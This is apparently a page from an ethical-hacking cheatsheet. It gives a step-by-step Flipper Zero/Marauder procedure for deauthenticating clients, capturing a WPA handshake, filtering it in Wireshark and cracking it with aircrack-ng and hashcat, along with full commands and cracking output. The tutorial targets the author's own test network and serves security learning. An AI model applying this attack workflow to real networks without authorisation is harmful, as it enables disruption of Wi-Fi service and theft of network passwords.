# WiFi Password Cracking

On this page, you will learn how to perform a deauth attack with Flipper Zero to obtain a .pcap file containing the handshake (encrypted password) of a Wi-Fi network, and how to crack it.

### WiFi Cracking <a href="#mifss" id="mifss"></a>

Let's look at the complete process of cracking a Wi-Fi password. The steps to follow are:

1. Have the Marauder Firmware installed
2. Scan the APs to find the target
3. Select the target AP ID
4. Select Sniff > Raw
5. Execute deauth attack
6. Download the .pcap file from qFlipper
7. Clean the .pcap file with Wireshark, filtering by`eapol`
8. Save new pcap file using only the handshake
9. Crack the .pcap with aircrack-ng or hashcat

### 1. Scan APs <a href="#id-1.-escanear-aps" id="id-1.-escanear-aps"></a>

Once we have Marauder installed, we can scan networks as follows:

1. Let's go`GPIO > ESP > Wifi Marauder`

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252F9HIy7lCNbNs6rLpWpZi9%252Fwifi-4.png%3Falt%3Dmedia%26token%3D4d140c8e-a26e-4c7f-8243-c768e22d1413&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=7bba51de&#x26;sv=2" alt=""><figcaption></figcaption></figure>

1. We selected`Scan ap`

We can switch `ap`to `station`scanning for devices connected to networks.

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FKbsmWPet3Z000DhjNkGC%252Fwifi-5.png%3Falt%3Dmedia%26token%3D4127ea92-4ee8-4574-aa3b-20beced3944a&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=c4bf2ab&#x26;sv=2" alt=""><figcaption></figcaption></figure>

1. We click it and it starts scanning all nearby Wi-Fi networks. This will help us identify the target network.

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FgqYfdNl5wQKNnfiIqKP9%252Fwifi-6.png%3Falt%3Dmedia%26token%3De1a0787b-af9b-4ff4-842f-6bb4bd38aa8e&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=629e9aa6&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### 2. See list of APs <a href="#id-2.-ver-listado-de-aps" id="id-2.-ver-listado-de-aps"></a>

If we go to that section `List`and select it, `ap`we see a detailed list of the available access points, each with an associated number. This number will be used to configure the deauth attack.

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FINC64Mk7DgmQx3wx175P%252Fwifi-9.png%3Falt%3Dmedia%26token%3D6b197b40-9ecd-4dbb-8c22-7e2e2d757a13&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=5ecd506f&#x26;sv=2" alt=""><figcaption></figcaption></figure>

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FOMF1d9EPu9Ac7uXPbUuF%252Fwifi-10.png%3Falt%3Dmedia%26token%3Df6a942c3-8567-4125-90c7-ee50c92837c5&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=190f1d2d&#x26;sv=2" alt=""><figcaption></figcaption></figure>

In our case, the target will be the network `INHACKEABLE` with the \[missing information `ID 1`]. You can configure a vulnerable Wi-Fi network to follow these sections from your router settings.

### 3. Select the target AP <a href="#id-3.-seleccionar-el-ap-objetivo" id="id-3.-seleccionar-el-ap-objetivo"></a>

We press `Select > ap`and enter the target network ID, in our case the `1`, which corresponds to the network `INHACKEABLE`.

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252F4OOMdKc6fyGGpZKRcYvx%252Fwifi-12.png%3Falt%3Dmedia%26token%3Dd9d98619-1ea7-4b48-bebb-fdc82a027cf7&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=b59ddf59&#x26;sv=2" alt=""><figcaption></figcaption></figure>

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FW2e61v5CgXk1yTIzOOEy%252Fwifi-11.png%3Falt%3Dmedia%26token%3D807878ee-e423-4a95-9951-d442d283d807&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=4c175c7a&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### 4. Enable Sniff Raw <a href="#id-4.-habilitar-sniff-raw" id="id-4.-habilitar-sniff-raw"></a>

In that section, `Sniff`we selected the option `raw`. This will allow us to collect all the raw information about the Wi-Fi attacks.

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FwUONQKte1MwnAWXmi10o%252Fwifi-13.png%3Falt%3Dmedia%26token%3D0cd54be9-4095-4715-9130-56db79d8c844&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=3c83f498&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### 5. Deauth Attack <a href="#id-5.-ataque-deauth" id="id-5.-ataque-deauth"></a>

Once all the previous steps are configured, select the option `Attack > deauth`, which will disconnect all devices from the target network. This is used to capture the handshake, which is the password for the encrypted Wi-Fi network.

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FHNsnYb8Q4qQXtVYKctPd%252Fwifi-15.png%3Falt%3Dmedia%26token%3Dafa71ea1-9dad-4480-85b0-b99407e1e8df&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=8ab55e97&#x26;sv=2" alt=""><figcaption></figcaption></figure>

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252Fy6RiJ0T0ybBiJf7jLkUT%252Fwifi-14.png%3Falt%3Dmedia%26token%3Dcc397700-47a9-43f3-b168-35265c4cddd5&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=a8a306db&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Once the deauth attack starts (as soon as a device disconnects), we quickly go back and click on the option `Sniff > raw`we had already configured to generate the .pcap file in the following path:



```
SD Card > app_data > marauder > pcaps
```

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FdWTrfde0DdnzWf8LYdpq%252Fwifi-pcap.png%3Falt%3Dmedia%26token%3Dda5f1df2-04df-47da-a6c5-703fc3166d0b&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=d5dd1caf&#x26;sv=2" alt=""><figcaption></figcaption></figure>

This file contains a lot of raw data, so we need to "clean" it to leave only the handshake and be able to crack it easily (if it has a weak password).

### 6. Clean the pcap with Wireshark <a href="#id-6.-limpiar-el-pcap-con-wireshark" id="id-6.-limpiar-el-pcap-con-wireshark"></a>

We're going to clean the .pcap file using Wireshark. To do this, we need to import the pcap file into Wireshark, filtering by \[specific filter `eapol`]. We can do this by dragging the file into the interface or by opening it from File:

<figure><img src="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FQ7nM49LoyW577bm9nGGX%252Fwire-1.png%3Falt%3Dmedia%26token%3Dfb9af50b-0a41-4148-9134-02124df485e0&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=79707f98&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Applying the filter `eapol`will show 4 messages. These are the 4 parts of the code `4 Way Handshake`, used in modern networks to encrypt the password in plaintext.

**Important** : The pcap file must contain all four messages, as these are the components of the handshake. If you don't get it on the first try, you must repeat the process until you have all the components, or the cracking will not work. These components are generated when the device connected to the network disconnects and reconnects automatically.

Once filtered, we click on it `File > Save as`and give it the name we want, like `handshake.pcap`.

### 7. Handshake cracking with Aircrack-ng <a href="#id-7.-crackeo-de-handshake-con-aircrack-ng" id="id-7.-crackeo-de-handshake-con-aircrack-ng"></a>

The simplest way to crack a handshake is by using Aircrack-ng on Kali Linux, although we could also use hashcat.

For this example, we could create a file containing the network password. We could also use different dictionaries such as [SecList](https://github.com/danielmiessler/SecLists) , the Rockyou dictionary, or create our own dictionary with crunch, for example.

```shellscript
nano pass.txt

1234
12345t
4567
34567
34567
09876
654
7654
223456
87654
4567
2343456
Passw0rd123
```

```shellscript
# Con rockyou
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt *.pcap 

# Diccionario de contraseñas default en routers
sudo aircrack-ng -w /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt *.pcap

# Con pass.txt
sudo aircrack-ng -w pass.txt handshake.pcap 
```

#### Using Rockyou <a href="#utilizando-rockyou" id="utilizando-rockyou"></a>

We must decompress the Rockyou dictionary before using it with the command:

```shellscript
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

Then we used aircrack-ng to start the cracking process

```shellscript
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt *.pcap

Reading packets, please wait...
Opening handshake.pcap
Opening sniffraw_2.pcap
Read 884 packets.

   #  BSSID              ESSID                     Encryption

   1  58:76:AC:02:2B:28  vodafoneBA2185            Unknown
   2  E4:66:AB:4C:31:EA  DIGIFIBRA-Z5RR            WPA (0 handshake)
   3  EA:66:AB:4C:31:EA  INHACKEABLE               WPA (1 handshake)
   4  F8:0D:A9:9F:A4:D1  DIGIFIBRA-D677            Unknown

Index number of target network ? 3

Reading packets, please wait...
Opening handshake.pcap
Opening sniffraw_2.pcap
```

```shellscript
      [00:01:56] 2049488/14344392 keys tested (17762.08 k/s) 

      Time left: 11 minutes, 32 seconds                         14.29%

                          KEY FOUND! [ Passw0rd123 ]


      Master Key     : 4B 83 63 7A 3F E0 DD 17 E9 42 7A 46 CC 16 E1 98 
                       05 16 F6 3D BC B9 4A 5D 65 B0 13 67 C7 A0 DB 8F 

      Transient Key  : 78 E4 58 5E EB AF 11 9E 29 E6 3D 6E B7 F2 46 B3 
                       FA BA 91 8E CC 6F 79 DF F6 A3 24 47 01 38 E1 18 
                       79 58 2D 22 A5 E5 F2 13 6E F7 05 B6 4D 67 6F 48 
                       70 68 3A EE 57 EB 14 2E 38 B2 70 6B 46 63 07 D2 

      EAPOL HMAC     : 6D 1D 58 AD 5D BC B7 93 62 B9 5C 41 20 E2 77 28 
```

The cracking works correctly and we obtain the password in plain text:`Passw0rd123`

### 8. Cracking with Hashcat <a href="#id-8.-cracking-con-hashcat" id="id-8.-cracking-con-hashcat"></a>

The advantage of using this method is that we can use the full power of the GPU to crack a handshake. To crack .pcap files with hashcat, we must convert them to a format that hashcat supports. We can do this using the following tool provided by hashcat itself:

{% embed url="https://hashcat.net/cap2hashcat/" %}

Once converted, it will generate a file with the extension `.hc22000`. We can easily crack this file using the following method `-m 22000`:

```
hashcat -m 22000 -d 1 handshake.hc22000 wordlist
```

```shellscript
# Con rockyou
hashcat -m 22000 -d 1 --status handshake.hc22000 /usr/share/wordlists/rockyou.txt

# Con ciccionario de contraseñas default en routers
hashcat -m 22000 -d 1 --status handshake.hc22000 /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
```

**Explanation of the Parameters**

* **`-m 22000`**→ Specifies that the hash is of the type`WPA-PMKID+EAPOL.`
* **`-d 1`**→ Use the GPU with the index `1`. Check `hashcat -I`if this is correct for your system.
* **`--status`**→ Shows the progress of the attack in real time.
* **`handshake.hc22000`**→ File converted to Hashcat format from a `.cap`using `hcxpcapngtool`.
* **Dictionary** → Defines the list of passwords to test
